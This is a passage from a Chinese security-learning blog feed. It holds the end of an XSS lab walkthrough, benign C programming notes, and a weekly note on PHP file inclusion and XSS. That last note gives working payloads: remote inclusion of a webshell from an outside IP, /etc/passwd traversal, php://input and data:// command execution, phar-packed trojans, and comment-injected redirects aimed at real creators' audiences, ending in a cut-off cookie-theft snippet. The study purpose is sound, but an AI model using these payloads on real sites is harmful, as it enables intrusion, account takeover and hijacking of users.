class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level16&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str5</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>发现这关的过滤导致我们不能用js标签或是js伪协议,且过滤了斜杠不能用双标签,还需绕过过滤空格</p><p>那么我们可以构建这样的payload,通过加载一张svg图片执行js代码,并且用%0a绕过过滤空格(%0a为回车符,在html中合法读成空格执行)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg%0aonload=<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)&gt; </span><br></pre></td></tr></table></figure><h3 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h3><p>先注意本关需要用chrome浏览器,发现是会加载插件</p><p>那我们可以构造这样的payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmouseover=<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样鼠标移动到此插件就能触发js代码</p><h3 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h3><p>和上题做法相同</p><h3 id="level-19-20"><a href="#level-19-20" class="headerlink" title="level 19-20"></a>level 19-20</h3><p>这两道题目环境有问题,本靶场潦草收场</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记2</title>
      <link href="/2023/10/18/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-18-%E7%AC%94%E8%AE%B02/"/>
      <url>/2023/10/18/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-18-%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h2 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h2><h3 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h3><ol><li><p>复制粘贴剪贴撤回: Ctrl + c &#x2F; v &#x2F; x &#x2F; z</p></li><li><p>移动代码块: Alt + 上下 或 鼠标拖动</p></li><li><p>快速复制: Alt + Shift + 上下</p></li><li><p>注释代码: Ctrl + ／</p></li><li><p>缩进: Tab &#x2F; Shift + Tab</p></li><li><p>删除单个单词: Ctrl + Backspace</p></li><li><p>切换窗口: Ctrl + Tab 应用内切换窗口<br>      Alt + Tab 切换所有窗口<br>      Win + Tab 切换应用</p></li></ol><h3 id="使用工具-软件"><a href="#使用工具-软件" class="headerlink" title="使用工具 &amp; 软件"></a>使用工具 &amp; 软件</h3><ol><li><p>截图: Ctrl + Alt + A (QQ) &#x2F; Win + Shift + S (系统)</p></li><li><p>录制: Win + G(系统) &#x2F; OBS</p></li><li><p>笔记: Typora, Obsidian, 飞书云文档, Hexo搭建博客</p></li><li><p>视频课资源: MOOC,BiliBili</p></li><li><p>文件查找: everything</p></li><li><p>思维导图: Xmind</p></li><li><p>电脑防护: 火绒</p></li><li><p>博客 &amp; 文档: 知乎,稀土掘金,Stack Overflow,Github,GPT</p></li></ol><h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><p>格式化输入输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有参数时</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;格式化字符&quot;</span>,参数列表);</span><br><span class="line"><span class="comment">// 没有参数时</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;非格式字符串&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> value = <span class="number">6</span>;</span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">    <span class="type">float</span> f = <span class="number">2.0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %c %f\n&quot;</span>,value,ch,f);<span class="comment">/*输出变量，变量之间空格，并在最后换行*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>首先，scanf函数在读取除字符之外的输入的时候会遵守以下原则：<br>scanf函数每次读取一个字符，跳过所有的空白字符，直到遇到第一个非空白字符的时候才开始读取。</p><p>然后，scanf以删除的方式从缓冲区读入数据(来自标准输入设备的数据存储在缓冲区)<br>也就是说，scanf从缓冲区读入一个数据项，该数据项在缓冲区中就被清除掉了。而如果scanf需要读取一个数据项，发现缓冲区当前是空的，那么程序就会在scanf代码处阻塞，等待用户输入，scanf函数接收到相应的数据项之后，在缓冲区中将这一数据项清除，scanf函数返回，程序继续执行。</p><h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><p>是内存空间的一部分。也就是说，在内存中预留了一定的存储空间，用来暂时保存输入或输出的数据，这部分预留的空间就叫做缓冲区。缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区_和输出缓冲区。_</p><p>scanf遇到空格，回车，tab都可以结束输入，gets只有回车能结束输入（至少输入一个字符或数字）</p><h3 id="字符输入输出"><a href="#字符输入输出" class="headerlink" title="字符输入输出"></a>字符输入输出</h3><h4 id="字符输出函数—-putchar"><a href="#字符输出函数—-putchar" class="headerlink" title="字符输出函数—-putchar()"></a>字符输出函数—-putchar()</h4><p>把从输出缓冲区中读取单个字符输出到标准输出设备</p><p>putchar(变量)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">67</span>;        <span class="comment">/*定义一个整型变量*/</span></span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;C&#x27;</span>;    <span class="comment">/*定义一个字符变量*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">putchar</span>(i);        <span class="comment">/*数字 67 的 ASCII是大写字母 C*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);    <span class="comment">/*换行效果，屏幕不显示*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(ch);    <span class="comment">/*输出字符变量*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;C&#x27;</span>);    <span class="comment">/*输出字符常量*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符输入函数—-getchar"><a href="#字符输入函数—-getchar" class="headerlink" title="字符输入函数—-getchar()"></a>字符输入函数—-getchar()</h4><p>从输入缓冲区上读取单个字符，返回值是字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> ch = <span class="number">0</span>;<span class="comment">/*初始化变量*/</span></span><br><span class="line"></span><br><span class="line">    ch = getchar();<span class="comment">/*字符输入*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(ch);<span class="comment">/*输出变量*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);<span class="comment">/*换行*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串输入输出"><a href="#字符串输入输出" class="headerlink" title="字符串输入输出"></a>字符串输入输出</h3><p>我们在编程的时候，经常要对字符进行操作</p><h4 id="字符串输出函数—-puts"><a href="#字符串输出函数—-puts" class="headerlink" title="字符串输出函数—-puts()"></a>字符串输出函数—-puts()</h4><p>从缓冲区中读取已经存在的字符串（包括空白字符）输出到标准输出设备并换行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(s);<span class="comment">/*s 为字符串变量*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;hello world!&quot;</span>;<span class="comment">/*定义一个数组，储存了一串字符串*/</span></span><br><span class="line">    <span class="type">char</span>* s=<span class="literal">NULL</span>;    <span class="comment">/*定义一个指针变量，初始化为空*/</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;hello world!&quot;</span>;    <span class="comment">/*指针指向一个字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(str);<span class="comment">/*输出字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(s);<span class="comment">/*输出字符串*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式里的字符串变量s在这里是数组 str 和指针 s。puts() 函数的作用与printf(“%s\n”,s)相同—–输出字符串并换行。</p><p>注 意：<br>①数组是同一类型的数据的集合，指针是用来表示内存地址的。后面会独立的介绍，在这里只要知道数组变量和指针变量可以存储字符串就行了。②puts()函数在遇到”\0”时，就会被替换为 “\n”，实现换行。</p><h4 id="字符串输入函数—–gets"><a href="#字符串输入函数—–gets" class="headerlink" title="字符串输入函数—–gets()"></a>字符串输入函数—–gets()</h4><p>读取输入缓冲区中存在的字符，直到遇到回车结束</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">26</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> *s = <span class="literal">NULL</span>;<span class="comment">/*定义一个数组和一个指针变量*/</span></span><br><span class="line"></span><br><span class="line">    gets(str);<span class="comment">/*获取输入的字符串*/</span></span><br><span class="line">    gets(s);<span class="comment">/*获取输入的字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(str);<span class="comment">/*输出字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(s);<span class="comment">/*输出字符串*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：<br>①用 gets 函数获取的字符串一般是放在字符变量里，也是使用数组变量和指针变量。gets 函数除了有输入字符的功能外，还有换行的作用。<br>②scanf()函数和gets()函数有明显区别，scanf函数在遇到空格、回车、空白符时结束输入，gets ()函数仅在遇到回车时结束输入。</p><h2 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h2><ol><li>写注释</li><li>变量命名（不能太随便太奇怪）</li><li>空行：独立代码块之间要空行<br>每个函数定义结束要空行等</li><li>缩进：if，switch，for等（条件下内部执行的语句要缩进）<strong>特殊</strong>：只有一条if可以放一行</li><li>分行：定义变量可以一个变量分一列</li><li>减少嵌套</li><li>空格：等号大小于号等双目运算符左右要空格(单目运算符前后不空格，如正负号)</li></ol><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>&amp;&amp;优先级大于||：在没有括号的情况下，||左右可以有带&amp;&amp;的组合式（优先结合&amp;&amp;）</p><p>if的括号里可以赋值，返回值就是赋的值：如if(a&#x3D;0)则返回值是0，不执行结果</p><h3 id="短路特性"><a href="#短路特性" class="headerlink" title="短路特性"></a>短路特性</h3><ol><li>如果if成立，<br>  不再执行后面的else if和else</li><li>如果&amp;&amp;的前面不成立，<br> 不再执行后面的内容</li><li>如果||的前面成立，<br>  不再执行后面的内容<br>多用于if赋值的情形</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 短路特性 例子1-1</span></span><br><span class="line"> <span class="type">int</span> a = <span class="number">2</span>, b = <span class="number">3</span>, c = <span class="number">4</span>;</span><br><span class="line"> <span class="keyword">if</span>((a = a &lt; b) || (c = <span class="number">3</span>)) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;a = %d , c = %d&quot;</span>, a, c);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>如以上结果输出a&#x3D;1,c&#x3D;4<br>因为先判断a&lt;b部分结果为真返回1赋值给a,那么此时a为1<br>那么在||运算符中前部分为真就已经可以使其生效,那么后面的c&#x3D;3语句就不再执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例子1-2</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">2</span>, b = <span class="number">3</span>, c = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span>((a /= b) &amp;&amp; (c = a-b)) &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;qwq&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a = %d , c = %d&quot;</span>, a, c);</span><br></pre></td></tr></table></figure><p>以上结果输出a&#x3D;0,c&#x3D;4<br>因为a &#x2F;&#x3D; b的结果保留整数为0,此时a为0<br>对于&amp;&amp;运算符必须前后都为真才能生效,那么前部分为0已经为假此语句已经失效,所以后面的c &#x3D; a-b语句不再执行</p><h3 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算结果=表达式<span class="number">1</span> ? 表达式<span class="number">2</span> : 表达式<span class="number">3</span></span><br></pre></td></tr></table></figure><p>若表达式1为真执行表达式2,为假执行表达式3</p><p>并且三目运算符可以嵌套,例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算结果=表达式<span class="number">1</span>   ?   表达式<span class="number">2</span>   :   表达式<span class="number">3</span>   ?   表达式<span class="number">4</span>  :   表达式<span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="switch-case语句"><a href="#switch-case语句" class="headerlink" title="switch,case语句"></a>switch,case语句</h3><p>case后面只能是整型或char类型的常量（即整数和单字符’  ‘里面可以是数字和大小写字母等，注意1和’1’是不一样的）</p><p>case后面只能是常量，我们可以预先定义常量：</p><ol><li><p>define定义</p></li><li><p>const定义</p></li></ol><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>while循环的语法结构类似于if语句</p><p>while循环中一定要注意在循环体内调整循环的次数</p><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for(初始化 ; 判断条件 ; 条件变量调整）<br>如for( a&#x3D;1 ; a&lt;6 ; a++ ）<br>for循环的三个表达式都可以省略<br>for( ; ; )依然可以执行（无限&#x2F;死循环）<br>表达式2只要不是0都可以执行(输入一个非零数字或者空着都代表无限&#x2F;死循环)<br>☆如果第二项为“非”直接跳出循环，不再执行第三项<br>☆第三项为单纯的a++和++a没有区别，但如果在第三项中调用a的值，则不同</p><h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>无论是三个循环中的哪一个，都可以在循环体中任意位置使用break和continue，break的作用是在满足你设置好的条件语句后，结束循环，而continue是跳过循环体中在continue之后的所有语句，开始进入下一次循环的流程</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记2-文件包含,XSS,文件上传</title>
      <link href="/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/"/>
      <url>/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>通过php函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。<br>而主要就是php中include()函数:包含并运行指定文件。</p><h3 id="通过远程代码生成webshell"><a href="#通过远程代码生成webshell" class="headerlink" title="通过远程代码生成webshell"></a>通过远程代码生成webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果我自建一个111.230.199.201&#x2F;test.txt这样的网站文件并在此写入木马,那么通过以下语句就能使目标网站运行我的恶意文件做到生成webshell</p><p>?file&#x3D;<a href="http://111.230.199.201/test.txt">http://111.230.199.201/test.txt</a></p><p>条件：allow_url_fopen、allow_url_include为on</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>如果是linux，可以以绝对路径查看?file&#x3D;&#x2F;etc&#x2F;passwd等敏感文件或是查看相对路径?file&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd等敏感文件</p><p>还可以加一些不存在的目录名，进行穿越、绕过,例如:?file&#x3D;&#x2F;etc&#x2F;ytm666&#x2F;..&#x2F;passwd</p><p>也可以使用file:&#x2F;&#x2F;伪协议:?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>而此伪协议的作用也是用来读取文件,以下重点介绍php伪协议来利用漏洞</p><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="通过php-filter查看源代码"><a href="#通过php-filter查看源代码" class="headerlink" title="通过php:&#x2F;&#x2F;filter查看源代码"></a>通过php:&#x2F;&#x2F;filter查看源代码</h4><p>构造这种形式的语句可以读取目标文件的源码并进行base64编码</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p><p>而这样可以读取到源码中的注释部分,且这样的方式也可以进行目录穿越的操作,如:</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;<strong>ytm666</strong>&#x2F;resource&#x3D;index.php</p><p>这种形式会使页面报错,但源码依旧会显示出来,所以没有影响.那么这种写法可以绕过一些对于路径有要求的题目,比如要求路径必须包含某些字符,就可以以这种方式绕过</p><h4 id="通过php-input伪协议进行命令执行"><a href="#通过php-input伪协议进行命令执行" class="headerlink" title="通过php:&#x2F;&#x2F;input伪协议进行命令执行"></a>通过php:&#x2F;&#x2F;input伪协议进行命令执行</h4><p>可以将php代码以post请求形式发送执行但要求allow_url_include为on,例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?file=php:<span class="comment">//input</span></span><br><span class="line">POST: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;dir&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="将php代码使用data-伪协议发送执行"><a href="#将php代码使用data-伪协议发送执行" class="headerlink" title="将php代码使用data:&#x2F;&#x2F;伪协议发送执行"></a>将php代码使用data:&#x2F;&#x2F;伪协议发送执行</h4><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs&#x2F;Pg&#x3D;&#x3D;<br>条件：allow_url_fopen、allow_url_include为on</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注:base64编码<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;dir&quot;</span>);<span class="meta">?&gt;</span>的结果为PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg==</span><br></pre></td></tr></table></figure><p>这样可以在网页直接执行编码的语句</p><h4 id="使用phar-伪协议执行压缩包中的恶意文件"><a href="#使用phar-伪协议执行压缩包中的恶意文件" class="headerlink" title="使用phar:&#x2F;&#x2F;伪协议执行压缩包中的恶意文件"></a>使用phar:&#x2F;&#x2F;伪协议执行压缩包中的恶意文件</h4><p>结合文件上传写一个一句话木马的文件shell_dir.php，将shell_dir.php压缩成shell_dir.zip，然后把压缩包重命名为shell_dir_zip.png<br>然后上传shell_dir_zip.png<br>那么结合?file&#x3D;phar:&#x2F;&#x2F;shell_dir_zip.png&#x2F;shell_dir.php这样的语句可以直接执行压缩包内的木马文件</p><p>而zip:&#x2F;&#x2F;伪协议作用一样,但需要改为?file&#x3D;zip:&#x2F;&#x2F;shell_dir_zip.png#shell_dir.php这样的格式</p><h2 id="XSS-跨站脚本"><a href="#XSS-跨站脚本" class="headerlink" title="XSS-跨站脚本"></a>XSS-跨站脚本</h2><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>我们先从最简单的一种情况来引入XSS攻击<br>例如在127.0.0.1&#x2F;xss.php中存在这样的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么这样我们就能进行一个简单的注入,例如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/xss.php?id=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么用户如果点击了类似于这样的攻击型网址,就会执行反射型XSS攻击,并造成危害,这也就是它作为反射型的原因,且只会执行一次</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>不同于反射型一般在url中进行注入,存储型一般会在博客评论，用户评论，留言板等等这些会把数据存储在数据库中的地方注入恶意代码</p><p>那么例如在某些留言板中,输入这样的代码:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么这条代码就被存在了本网站的数据库中,那么作为用户来访问此网页时,就自动的会被执行我们输入的命令,并且由于我们输入的评论(代码)存储在数据库中,所以不必和我们的评论进行交互而是直接会执行</p><h3 id="利用XSS造成危害"><a href="#利用XSS造成危害" class="headerlink" title="利用XSS造成危害"></a>利用XSS造成危害</h3><p>之前的例子中演示了XSS的原理,现在我们可以真正的去利用XSS漏洞来造成危害了,接下来举几个典型的例子</p><h4 id="劫持流量实现恶意跳转"><a href="#劫持流量实现恶意跳转" class="headerlink" title="劫持流量实现恶意跳转"></a>劫持流量实现恶意跳转</h4><p>想象一下,现在你看一个up很火非常不爽,想把它粉丝的流量引走,你可以怎么做呢?</p><p>依据之前的原理,我们可以在这个百万up主的评论中输入这样一段代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://Yantm666.github.io&quot;</span>&lt;script&gt;</span></span><br></pre></td></tr></table></figure><p>这样他的粉丝点进去直接就跳转到我的博客了,那么你也成功做到了让这位up失去粉丝的流量,甚至引流到我博客了哈哈(但是你可能需要在他的评论区抢个前排)</p><h4 id="窃取cookie"><a href="#窃取cookie" class="headerlink" title="窃取cookie"></a>窃取cookie</h4><p>用户登录成功后，一般把登录凭证存储在cookie中</p><p>如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。</p><p>登录之后就可以尝试修改你的密码</p><p>我们可以通过这样的代码获取cookie值:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span 